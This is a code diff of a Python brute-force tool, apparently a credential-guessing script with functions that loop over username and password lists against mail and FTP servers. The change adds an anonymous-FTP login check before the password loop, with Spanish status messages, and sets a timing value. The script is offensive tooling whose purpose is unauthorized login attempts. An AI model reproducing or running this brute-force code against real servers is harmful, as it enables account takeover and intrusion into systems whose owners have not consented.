@@ -37,6 +37,14 @@ def bforcemail(users, passwords, server):
 	server.quit()
 def bforceftp(users, passwords, server, tm):
 	conexion = FTP(server)
+	try:
+		conexion.login('anonymous', '')
+	except:
+		print("No se puede acceder al FTP de manera anonima.")
+	else:
+		print("El usuario es anonymous y no tiene contraseña.")
+		exit()
+
 	for user in users:
 		for password in passwords:
 			try:
@@ -98,7 +106,7 @@ if __name__ == '__main__':
 		ip = str()
 		argcount = 1
 		fl = str()
-		#time = 5
+		time = 3
 		ftp, mail, bzip = False, False, False
 		counto = 0
 		countom = 0
